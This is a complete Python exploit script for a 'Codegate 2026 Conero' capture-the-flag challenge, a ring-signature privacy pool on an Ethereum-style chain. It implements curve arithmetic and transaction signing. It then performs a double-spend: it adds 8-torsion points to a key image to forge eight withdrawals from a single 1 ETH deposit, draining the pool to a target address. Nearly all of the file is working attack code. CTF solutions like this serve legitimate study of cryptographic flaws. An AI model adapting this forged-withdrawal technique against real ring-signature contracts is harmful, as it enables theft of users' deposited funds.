#!/usr/bin/env python3
import argparse
import hashlib
import hmac
import json
import math
import os
import random
import struct
import sys
import time
from dataclasses import dataclass
from typing import Any, Iterable, Optional

import requests


POOL_ADDRESS = "0x00000000000000000000000000000000000010c0"
TARGET_ADDRESS = "0x0000000000000000000000000000000000001337"
PLAYER_PREFUND_WEI = 1_100_000_000_000_000_000
INITIAL_POOL_WEI = 7_000_000_000_000_000_000
ONE_ETH = 1_000_000_000_000_000_000

DOMAIN_SPEND_SCALAR = b"conero/spend-scalar"
DOMAIN_COMMITMENT = b"conero/note-commitment"
DOMAIN_HASH_POINT_BASE1 = b"conero/hash-to-point/base-1"
DOMAIN_HASH_POINT_BASE2 = b"conero/hash-to-point/base-2"
DOMAIN_HASH_TO_POINT_SC1 = b"conero/hash-to-point/scalar-1"
DOMAIN_HASH_TO_POINT_SC2 = b"conero/hash-to-point/scalar-2"
DOMAIN_WITHDRAW_CTX = b"conero:ring-withdraw-context"
DOMAIN_PROOF_CHALLENGE = b"conero:ring-transfer-challenge"

# Edwards25519 parameters.
ED_P = 2**255 - 19
ED_D = (-121665 * pow(121666, -1, ED_P)) % ED_P
ED_D2 = (2 * ED_D) % ED_P
ED_L = 2**252 + 27742317777372353535851937790883648493
ED_I = pow(2, (ED_P - 1) // 4, ED_P)  # sqrt(-1) mod p
ED_BASE_COMPRESSED = bytes.fromhex(
    "5866666666666666666666666666666666666666666666666666666666666666"
)

# secp256k1 parameters.
SECP_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
SECP_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
SECP_GX = 55066263022277343669578718895168534326250603453777594175500187360389116729240
SECP_GY = 32670510020758816978083085130507043184471273380659243275938904335757337482424

REQUEST_TIMEOUT = 15
RECEIPT_TIMEOUT = 30
POLL_INTERVAL = 0.25


class RPCError(RuntimeError):
    pass


class HTTPError(RuntimeError):
    pass


class ExploitError(RuntimeError):
    pass


class RPC:
    def __init__(self, url: str):
        self.url = url.rstrip("/")
        self.session = requests.Session()
        self._next_id = 1

    def call(self, method: str, params: list[Any]) -> Any:
        payload = {
            "jsonrpc": "2.0",
            "id": self._next_id,
            "method": method,
            "params": params,
        }
        self._next_id += 1
        try:
            resp = self.session.post(self.url, json=payload, timeout=REQUEST_TIMEOUT)
        except requests.RequestException as exc:
            raise HTTPError(f"{method}: HTTP request failed: {exc}") from exc
        try:
            data = resp.json()
        except ValueError as exc:
            raise HTTPError(f"{method}: invalid JSON response: {resp.text[:300]!r}") from exc
        if "error" in data and data["error"]:
            err = data["error"]
            raise RPCError(f"{method}: RPC error {err.get('code')}: {err.get('message')}")
        if "result" not in data:
            raise HTTPError(f"{method}: malformed response: {data!r}")
        return data["result"]

    def sha3(self, data: bytes) -> bytes:
        out = self.call("web3_sha3", ["0x" + data.hex()])
        return hex_to_bytes(out, expected_len=32)

    def chain_id(self) -> int:
        return int(self.call("eth_chainId", []), 16)

    def gas_price(self) -> int:
        return int(self.call("eth_gasPrice", []), 16)

    def nonce(self, address: str) -> int:
        return int(self.call("eth_getTransactionCount", [address, "latest"]), 16)

    def balance(self, address: str) -> int:
        return int(self.call("eth_getBalance", [address, "latest"]), 16)

    def send_raw_transaction(self, raw: bytes) -> str:
        return self.call("eth_sendRawTransaction", ["0x" + raw.hex()])

    def get_receipt(self, tx_hash: str) -> Optional[dict[str, Any]]:
        return self.call("eth_getTransactionReceipt", [tx_hash])

    def wait_receipt(self, tx_hash: str, timeout: float = RECEIPT_TIMEOUT) -> dict[str, Any]:
        deadline = time.time() + timeout
        while time.time() < deadline:
            receipt = self.get_receipt(tx_hash)
            if receipt:
                return receipt
            time.sleep(POLL_INTERVAL)
        raise ExploitError(f"timed out waiting for receipt {tx_hash}")

    def estimate_gas(self, tx_obj: dict[str, Any]) -> int:
        return int(self.call("eth_estimateGas", [tx_obj]), 16)

    # Local-only helpers.
    def accounts(self) -> list[str]:
        return self.call("eth_accounts", [])

    def send_transaction(self, tx_obj: dict[str, Any]) -> str:
        return self.call("eth_sendTransaction", [tx_obj])


# -------------------------
# Edwards25519 primitives.
# -------------------------

def ed_mod_sqrt(a: int) -> Optional[int]:
    if a == 0:
        return 0
    x = pow(a, (ED_P + 3) // 8, ED_P)
    if (x * x - a) % ED_P != 0:
        x = (x * ED_I) % ED_P
    if (x * x - a) % ED_P != 0:
        return None
    return x


@dataclass(frozen=True)
class EdPoint:
    X: int
    Y: int
    Z: int
    T: int

    @staticmethod
    def identity() -> "EdPoint":
        return EdPoint(0, 1, 1, 0)

    @staticmethod
    def from_affine(x: int, y: int) -> "EdPoint":
        return EdPoint(x % ED_P, y % ED_P, 1, (x * y) % ED_P)

    @staticmethod
    def decode(data: bytes) -> "EdPoint":
        if len(data) != 32:
            raise ValueError("compressed point must be 32 bytes")
        y = int.from_bytes(data, "little") & ((1 << 255) - 1)
        sign = data[31] >> 7
        if y >= ED_P:
            raise ValueError("invalid y coordinate")
        y2 = (y * y) % ED_P
        u = (y2 - 1) % ED_P
        v = (ED_D * y2 + 1) % ED_P
        x2 = (u * pow(v, -1, ED_P)) % ED_P
        x = ed_mod_sqrt(x2)
        if x is None:
            raise ValueError("point not on curve")
        if (x & 1) != sign:
            x = (-x) % ED_P
        if (-x * x + y * y - 1 - ED_D * x * x * y * y) % ED_P != 0:
            raise ValueError("point equation mismatch")
        return EdPoint.from_affine(x, y)

    def to_affine(self) -> tuple[int, int]:
        zinv = pow(self.Z, -1, ED_P)
        return (self.X * zinv) % ED_P, (self.Y * zinv) % ED_P

    def encode(self) -> bytes:
        x, y = self.to_affine()
        out = bytearray(y.to_bytes(32, "little"))
        out[31] |= (x & 1) << 7
        return bytes(out)

    def eq(self, other: "EdPoint") -> bool:
        return (
            (self.X * other.Z - other.X * self.Z) % ED_P == 0
            and (self.Y * other.Z - other.Y * self.Z) % ED_P == 0
        )


ED_ID = EdPoint.identity()
ED_BASE = EdPoint.decode(ED_BASE_COMPRESSED)


def ed_add(P: EdPoint, Q: EdPoint) -> EdPoint:
    a = ((P.Y - P.X) * (Q.Y - Q.X)) % ED_P
    b = ((P.Y + P.X) * (Q.Y + Q.X)) % ED_P
    c = (P.T * ED_D2 * Q.T) % ED_P
    d = (P.Z * 2 * Q.Z) % ED_P
    e = (b - a) % ED_P
    f = (d - c) % ED_P
    g = (d + c) % ED_P
    h = (b + a) % ED_P
    return EdPoint((e * f) % ED_P, (g * h) % ED_P, (f * g) % ED_P, (e * h) % ED_P)


def ed_double(P: EdPoint) -> EdPoint:
    a = (P.X * P.X) % ED_P
    b = (P.Y * P.Y) % ED_P
    c = (2 * P.Z * P.Z) % ED_P
    d = (-a) % ED_P
    e = (((P.X + P.Y) * (P.X + P.Y)) - a - b) % ED_P
    g = (d + b) % ED_P
    f = (g - c) % ED_P
    h = (d - b) % ED_P
    return EdPoint((e * f) % ED_P, (g * h) % ED_P, (f * g) % ED_P, (e * h) % ED_P)


def ed_neg(P: EdPoint) -> EdPoint:
    return EdPoint((-P.X) % ED_P, P.Y, P.Z, (-P.T) % ED_P)


def ed_scalar_mult(P: EdPoint, scalar: int) -> EdPoint:
    Q = ED_ID
    N = P
    k = scalar
    while k:
        if k & 1:
            Q = ed_add(Q, N)
        N = ed_double(N)
        k >>= 1
    return Q


def ed_uniform_scalar(domain: bytes, msg: bytes) -> int:
    digest = hashlib.sha512(domain + msg).digest()
    return int.from_bytes(digest, "little") % ED_L


def ed_scalar_bytes(scalar: int) -> bytes:
    if not (0 <= scalar < ED_L):
        raise ValueError("scalar out of range")
    return scalar.to_bytes(32, "little")


def ed_is_prime_order(P: EdPoint) -> bool:
    return (not P.eq(ED_ID)) and (not ed_scalar_mult(P, 8).eq(ED_ID)) and ed_scalar_mult(P, ED_L).eq(ED_ID)


def derive_hash_point_base(domain: bytes) -> EdPoint:
    idx = 0
    while True:
        digest32 = hashlib.sha512(domain + struct.pack("<I", idx)).digest()[:32]
        try:
            P = EdPoint.decode(digest32)
        except ValueError:
            idx += 1
            continue
        if ed_is_prime_order(P):
            return P
        idx += 1


_HASH_POINT_BASE1 = derive_hash_point_base(DOMAIN_HASH_POINT_BASE1)
_HASH_POINT_BASE2 = derive_hash_point_base(DOMAIN_HASH_POINT_BASE2)


def scalar_from_secret(secret: bytes) -> int:
    if len(secret) != 32:
        raise ValueError("secret must be 32 bytes")
    return ed_uniform_scalar(DOMAIN_SPEND_SCALAR, secret)


def public_key_from_secret(secret: bytes) -> bytes:
    x = scalar_from_secret(secret)
    return ed_scalar_mult(ED_BASE, x).encode()


def hash_to_point(pubkey: bytes) -> EdPoint:
    s1 = ed_uniform_scalar(DOMAIN_HASH_TO_POINT_SC1, pubkey)
    s2 = ed_uniform_scalar(DOMAIN_HASH_TO_POINT_SC2, pubkey)
    P1 = ed_scalar_mult(_HASH_POINT_BASE1, s1)
    P2 = ed_scalar_mult(_HASH_POINT_BASE2, s2)
    H = ed_add(P1, P2)
    if H.eq(ED_ID):
        raise ExploitError("hash_to_point produced identity")
    return H


def note_commitment(pubkey: bytes, amount: int) -> bytes:
    if len(pubkey) != 32:
        raise ValueError("public key must be 32 bytes")
    if not (0 <= amount < (1 << 64)):
        raise ValueError("amount out of uint64 range")
    return hashlib.sha256(DOMAIN_COMMITMENT + pubkey + struct.pack("<Q", amount)).digest()


def torsion_points() -> list[EdPoint]:
    # Generator of the 8-torsion subgroup.
    gen = EdPoint.decode(bytes.fromhex("26e8958fc2b227b045c3f489f2ef98f0d5dfac05d3c63339b13802886d53fc85"))
    return [ed_scalar_mult(gen, i) for i in range(8)]


TORSION_POINTS = torsion_points()
TORSION_ORDER = {i: 1 if i == 0 else 8 // math.gcd(i, 8) for i in range(8)}


# --------------------
# secp256k1 utilities.
# --------------------

@dataclass(frozen=True)
class SecpPoint:
    x: int
    y: int


SECP_G = SecpPoint(SECP_GX, SECP_GY)
SECP_INF: Optional[SecpPoint] = None


def secp_is_inf(P: Optional[SecpPoint]) -> bool:
    return P is None


def secp_add(P: Optional[SecpPoint], Q: Optional[SecpPoint]) -> Optional[SecpPoint]:
    if P is None:
        return Q
    if Q is None:
        return P
    if P.x == Q.x and (P.y + Q.y) % SECP_P == 0:
        return None
    if P.x == Q.x and P.y == Q.y:
        lam = (3 * P.x * P.x) * pow(2 * P.y, -1, SECP_P)
    else:
        lam = (Q.y - P.y) * pow(Q.x - P.x, -1, SECP_P)
    lam %= SECP_P
    x3 = (lam * lam - P.x - Q.x) % SECP_P
    y3 = (lam * (P.x - x3) - P.y) % SECP_P
    return SecpPoint(x3, y3)


def secp_mul(P: Optional[SecpPoint], scalar: int) -> Optional[SecpPoint]:
    Q = None
    N = P
    k = scalar
    while k:
        if k & 1:
            Q = secp_add(Q, N)
        N = secp_add(N, N)
        k >>= 1
    return Q


def int2octets(x: int) -> bytes:
    return x.to_bytes(32, "big")


def bits2octets(b: bytes) -> bytes:
    z1 = int.from_bytes(b, "big")
    z2 = z1 % SECP_N
    return int2octets(z2)


def rfc6979_k(privkey: int, h1: bytes) -> int:
    V = b"\x01" * 32
    K = b"\x00" * 32
    bx = int2octets(privkey) + bits2octets(h1)
    K = hmac.new(K, V + b"\x00" + bx, hashlib.sha256).digest()
    V = hmac.new(K, V, hashlib.sha256).digest()
    K = hmac.new(K, V + b"\x01" + bx, hashlib.sha256).digest()
    V = hmac.new(K, V, hashlib.sha256).digest()
    while True:
        T = b""
        while len(T) < 32:
            V = hmac.new(K, V, hashlib.sha256).digest()
            T += V
        k = int.from_bytes(T[:32], "big")
        if 1 <= k < SECP_N:
            return k
        K = hmac.new(K, V + b"\x00", hashlib.sha256).digest()
        V = hmac.new(K, V, hashlib.sha256).digest()


def secp_sign_digest(privkey: int, digest32: bytes) -> tuple[int, int, int]:
    z = int.from_bytes(digest32, "big")
    extra = 0
    while True:
        seed = digest32 if extra == 0 else hashlib.sha256(digest32 + bytes([extra])).digest()
        k = rfc6979_k(privkey, seed)
        R = secp_mul(SECP_G, k)
        if R is None or R.x >= SECP_N:
            extra += 1
            continue
        r = R.x % SECP_N
        if r == 0:
            extra += 1
            continue
        s = (pow(k, -1, SECP_N) * (z + r * privkey)) % SECP_N
        if s == 0:
            extra += 1
            continue
        recid = R.y & 1
        if s > SECP_N // 2:
            s = SECP_N - s
            recid ^= 1
        return r, s, recid


def secp_pubkey(privkey: int) -> SecpPoint:
    P = secp_mul(SECP_G, privkey)
    if P is None:
        raise ExploitError("invalid private key produced point at infinity")
    return P


# -----------------
# Encoding helpers.
# -----------------

def strip_0x(s: str) -> str:
    return s[2:] if s.startswith(("0x", "0X")) else s


def hex_to_bytes(s: str, expected_len: Optional[int] = None) -> bytes:
    raw = bytes.fromhex(strip_0x(s))
    if expected_len is not None and len(raw) != expected_len:
        raise ValueError(f"expected {expected_len} bytes, got {len(raw)}")
    return raw


def qty(n: int) -> str:
    if n < 0:
        raise ValueError("negative quantity")
    return hex(n)


def address_bytes(addr: str) -> bytes:
    raw = hex_to_bytes(addr, expected_len=20)
    return raw


def rlp_encode(item: Any) -> bytes:
    if isinstance(item, int):
        if item == 0:
            data = b""
        else:
            data = item.to_bytes((item.bit_length() + 7) // 8, "big")
        return rlp_encode(data)
    if isinstance(item, bytes):
        data = item
        if len(data) == 1 and data[0] < 0x80:
            return data
        if len(data) <= 55:
            return bytes([0x80 + len(data)]) + data
        l = len(data).to_bytes((len(data).bit_length() + 7) // 8, "big")
        return bytes([0xb7 + len(l)]) + l + data
    if isinstance(item, str):
        return rlp_encode(hex_to_bytes(item))
    if isinstance(item, Iterable):
        payload = b"".join(rlp_encode(x) for x in item)
        if len(payload) <= 55:
            return bytes([0xc0 + len(payload)]) + payload
        l = len(payload).to_bytes((len(payload).bit_length() + 7) // 8, "big")
        return bytes([0xf7 + len(l)]) + l + payload
    raise TypeError(f"unsupported RLP type: {type(item)!r}")


# -----------------
# Conero functions.
# -----------------

def withdraw_context_bytes(member_pubkeys: list[bytes], amount: int, recipient: str, withdraw_amount: int) -> bytes:
    if len(member_pubkeys) != 1:
        raise ValueError("this exploit only supports a 1-member ring")
    buf = bytearray()
    buf += DOMAIN_WITHDRAW_CTX
    buf.append(1)  # ring count
    buf.append(1)  # ring size
    buf += struct.pack("<Q", amount)
    buf += member_pubkeys[0]
    buf += address_bytes(recipient)
    buf += struct.pack("<Q", withdraw_amount)
    buf.append(0)  # no change
    return bytes(buf)


def ring_challenge(context_hash: bytes, key_image: bytes, L_enc: bytes, R_enc: bytes) -> int:
    digest = hashlib.sha512(DOMAIN_PROOF_CHALLENGE + context_hash + key_image + L_enc + R_enc).digest()
    return int.from_bytes(digest, "little") % ED_L


def build_withdraw_data(pubkey: bytes, amount: int, key_image: bytes, c0: int, response: int, recipient: str, withdraw_amount: int) -> bytes:
    data = bytearray()
    data.append(0x04)
    data.append(1)  # ring count
    data.append(1)  # ring size
    data += struct.pack("<Q", amount)
    data += pubkey
    data += key_image
    data += ed_scalar_bytes(c0)
    data += ed_scalar_bytes(response)
    data += address_bytes(recipient)
    data += struct.pack("<Q", withdraw_amount)
    data.append(0)  # no change
    return bytes(data)


def build_deposit_data(pubkey: bytes) -> bytes:
    return b"\x01" + pubkey + (b"\x00" * 32)


# --------------------
# Challenge orchestration.
# --------------------

def solve_pow(prefix: str, bits: int) -> str:
    target = 1 << (256 - bits)
    i = 0
    while True:
        nonce = str(i)
        digest = hashlib.sha256((prefix + nonce).encode()).digest()
        if int.from_bytes(digest, "big") < target:
            return nonce
        i += 1


def http_json(method: str, url: str, *, json_body: Optional[dict[str, Any]] = None) -> dict[str, Any]:
    try:
        if method == "GET":
            resp = requests.get(url, timeout=REQUEST_TIMEOUT)
        elif method == "POST":
            resp = requests.post(url, json=json_body, timeout=REQUEST_TIMEOUT)
        else:
            raise ValueError(f"unsupported method {method}")
    except requests.RequestException as exc:
        raise HTTPError(f"{method} {url}: request failed: {exc}") from exc
    try:
        return resp.json()
    except ValueError as exc:
        raise HTTPError(f"{method} {url}: invalid JSON response: {resp.text[:300]!r}") from exc


@dataclass
class Instance:
    uuid: str
    rpc_url: str
    player_key_hex: str
    player_address: str
    base_url: Optional[str] = None

    @property
    def flag_url(self) -> Optional[str]:
        if self.base_url is None:
            return None
        return self.base_url.rstrip("/") + f"/{self.uuid}/flag"


@dataclass
class SpendPlan:
    pubkey: bytes
    secret: bytes
    amount: int
    recipient: str
    context_hash: bytes
    withdraw_datas: list[bytes]


def create_instance(base_url: str) -> Instance:
    base = base_url.rstrip("/")
    pow_info = http_json("GET", base + "/pow")
    if not pow_info.get("ok"):
        raise ExploitError(f"failed to get PoW challenge: {pow_info}")
    prefix = pow_info["prefix"]
    bits = int(pow_info["bits"])
    nonce = solve_pow(prefix, bits)
    create = http_json(
        "POST",
        base + "/new",
        json_body={"pow_prefix": prefix, "pow_nonce": nonce},
    )
    if not create.get("ok"):
        raise ExploitError(f"failed to create instance: {create}")
    return Instance(
        uuid=create["uuid"],
        rpc_url=create["rpc_url"],
        player_key_hex=create["player_key"],
        player_address=create["player_address"],
        base_url=base,
    )


def derive_eth_address(rpc: RPC, privkey_int: int) -> str:
    pub = secp_pubkey(privkey_int)
    uncompressed = b"\x04" + pub.x.to_bytes(32, "big") + pub.y.to_bytes(32, "big")
    digest = rpc.sha3(uncompressed[1:])
    return "0x" + digest[-20:].hex()


def sign_legacy_tx(
    rpc: RPC,
    privkey_int: int,
    *,
    nonce: int,
    to: str,
    value: int,
    gas: int,
    gas_price: int,
    data: bytes,
    chain_id: int,
) -> bytes:
    unsigned = [
        nonce,
        gas_price,
        gas,
        address_bytes(to),
        value,
        data,
        chain_id,
        0,
        0,
    ]
    sighash = rpc.sha3(rlp_encode(unsigned))
    r, s, recid = secp_sign_digest(privkey_int, sighash)
    v = recid + 35 + 2 * chain_id
    signed = [nonce, gas_price, gas, address_bytes(to), value, data, v, r, s]
    return rlp_encode(signed)


def send_signed_tx(
    rpc: RPC,
    privkey_int: int,
    from_addr: str,
    *,
    to: str,
    value: int,
    data: bytes,
    gas_hint: Optional[int] = None,
) -> str:
    chain_id = rpc.chain_id()
    nonce = rpc.nonce(from_addr)
    gas_price = rpc.gas_price()
    tx_obj = {
        "from": from_addr,
        "to": to,
        "value": qty(value),
        "data": "0x" + data.hex(),
    }
    estimate = rpc.estimate_gas(tx_obj)
    gas = gas_hint if gas_hint is not None else estimate + 20_000
    raw = sign_legacy_tx(
        rpc,
        privkey_int,
        nonce=nonce,
        to=to,
        value=value,
        gas=gas,
        gas_price=gas_price,
        data=data,
        chain_id=chain_id,
    )
    tx_hash = rpc.send_raw_transaction(raw)
    receipt = rpc.wait_receipt(tx_hash)
    status = int(receipt["status"], 16)
    if status != 1:
        raise ExploitError(f"transaction {tx_hash} failed with status {status}")
    return tx_hash


def prepare_spend_plan(rpc: RPC, secret: bytes, amount: int = ONE_ETH, recipient: str = TARGET_ADDRESS) -> SpendPlan:
    x = scalar_from_secret(secret)
    pubkey = public_key_from_secret(secret)
    Hp = hash_to_point(pubkey)
    K = ed_scalar_mult(Hp, x)
    context_hash = rpc.sha3(withdraw_context_bytes([pubkey], amount, recipient, amount))

    withdraw_datas: list[bytes] = []
    for idx, T in enumerate(TORSION_POINTS):
        key_image = ed_add(K, T)
        key_image_bytes = key_image.encode()
        required_divisor = TORSION_ORDER[idx]
        attempts = 0
        while True:
            attempts += 1
            alpha = random.SystemRandom().randrange(1, ED_L)
            Lp = ed_scalar_mult(ED_BASE, alpha)
            Rp = ed_scalar_mult(Hp, alpha)
            c0 = ring_challenge(context_hash, key_image_bytes, Lp.encode(), Rp.encode())
            if c0 % required_divisor == 0:
                break
        response = (alpha - (c0 * x)) % ED_L
        withdraw_datas.append(
            build_withdraw_data(pubkey, amount, key_image_bytes, c0, response, recipient, amount)
        )
    return SpendPlan(pubkey=pubkey, secret=secret, amount=amount, recipient=recipient, context_hash=context_hash, withdraw_datas=withdraw_datas)


def exploit_instance(instance: Instance) -> str:
    rpc = RPC(instance.rpc_url)
    priv_int = int(strip_0x(instance.player_key_hex), 16)
    from_addr = instance.player_address
    # Optional sanity check when direct mode did not provide the address.
    if from_addr:
        derived = derive_eth_address(rpc, priv_int)
        if derived.lower() != from_addr.lower():
            raise ExploitError(f"player address mismatch: provided {from_addr}, derived {derived}")
    else:
        from_addr = derive_eth_address(rpc, priv_int)

    player_balance = rpc.balance(from_addr)
    if player_balance < ONE_ETH:
        raise ExploitError(f"player balance too low: {player_balance}")

    secret = os.urandom(32)
    plan = prepare_spend_plan(rpc, secret, amount=ONE_ETH, recipient=TARGET_ADDRESS)

    deposit_tx = send_signed_tx(
        rpc,
        priv_int,
        from_addr,
        to=POOL_ADDRESS,
        value=ONE_ETH,
        data=build_deposit_data(plan.pubkey),
    )
    print(f"[+] deposit tx:   {deposit_tx}")

    for idx, data in enumerate(plan.withdraw_datas):
        tx_hash = send_signed_tx(
            rpc,
            priv_int,
            from_addr,
            to=POOL_ADDRESS,
            value=0,
            data=data,
        )
        print(f"[+] withdraw {idx + 1}/8: {tx_hash}")

    pool_balance = rpc.balance(POOL_ADDRESS)
    target_balance = rpc.balance(TARGET_ADDRESS)
    print(f"[+] pool balance:   {pool_balance}")
    print(f"[+] target balance: {target_balance}")
    if pool_balance != 0:
        raise ExploitError("pool was not drained to zero")
    if target_balance <= INITIAL_POOL_WEI:
        raise ExploitError("target did not exceed initial pool balance")

    if instance.flag_url:
        try:
            resp = requests.get(instance.flag_url, timeout=REQUEST_TIMEOUT)
            flag = resp.text.strip()
            print(flag)
            return flag
        except requests.RequestException as exc:
            raise HTTPError(f"failed to fetch flag: {exc}") from exc
    return f"drained successfully; pool={pool_balance}, target={target_balance}"


# -----------------
# Local test setup.
# -----------------

def local_send_and_wait(rpc: RPC, tx_obj: dict[str, Any]) -> str:
    tx_hash = rpc.send_transaction(tx_obj)
    receipt = rpc.wait_receipt(tx_hash)
    status = int(receipt["status"], 16)
    if status != 1:
        raise ExploitError(f"local tx {tx_hash} failed with status {status}")
    return tx_hash


def setup_local_chain(rpc_url: str) -> Instance:
    rpc = RPC(rpc_url)
    accounts = rpc.accounts()
    if not accounts:
        raise ExploitError("local chain exposed no unlocked accounts")
    dev = accounts[0]

    player_key_int = int.from_bytes(os.urandom(32), "big") % SECP_N
    if player_key_int == 0:
        player_key_int = 1
    player_addr = derive_eth_address(rpc, player_key_int)

    print(f"[+] local dev account:  {dev}")
    print(f"[+] local player addr:  {player_addr}")
    print(f"[+] local player priv:  0x{player_key_int:064x}")

    tx1 = local_send_and_wait(
        rpc,
        {
            "from": dev,
            "to": player_addr,
            "value": qty(PLAYER_PREFUND_WEI),
        },
    )
    print(f"[+] funded player:  {tx1}")

    bootstrap_secret = os.urandom(32)
    bootstrap_pub = public_key_from_secret(bootstrap_secret)
    tx2 = local_send_and_wait(
        rpc,
        {
            "from": dev,
            "to": POOL_ADDRESS,
            "value": qty(INITIAL_POOL_WEI),
            "gas": qty(120_000),
            "data": "0x" + build_deposit_data(bootstrap_pub).hex(),
        },
    )
    print(f"[+] bootstrap deposit: {tx2}")

    return Instance(
        uuid="local",
        rpc_url=rpc_url,
        player_key_hex=f"0x{player_key_int:064x}",
        player_address=player_addr,
        base_url=None,
    )


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit Codegate 2026 Conero")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--base-url", help="instancer base URL, e.g. http://host")
    group.add_argument("--rpc-url", help="direct RPC URL for an already-created instance")
    group.add_argument("--local-rpc", help="local geth RPC URL; bootstrap a fresh local test chain first")
    parser.add_argument("--player-key", help="player private key (required with --rpc-url)")
    parser.add_argument("--player-address", help="player address (optional with --rpc-url)")
    args = parser.parse_args()

    try:
        if args.base_url:
            instance = create_instance(args.base_url)
            print(f"[+] uuid:          {instance.uuid}")
            print(f"[+] rpc_url:       {instance.rpc_url}")
            print(f"[+] player_addr:   {instance.player_address}")
            print(f"[+] player_key:    {instance.player_key_hex}")
        elif args.rpc_url:
            if not args.player_key:
                raise ExploitError("--player-key is required with --rpc-url")
            instance = Instance(
                uuid="direct",
                rpc_url=args.rpc_url,
                player_key_hex=args.player_key,
                player_address=args.player_address or "",
                base_url=None,
            )
        else:
            instance = setup_local_chain(args.local_rpc)

        result = exploit_instance(instance)
        print(f"[+] result: {result}")
        return 0
    except (ExploitError, RPCError, HTTPError, requests.RequestException, ValueError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
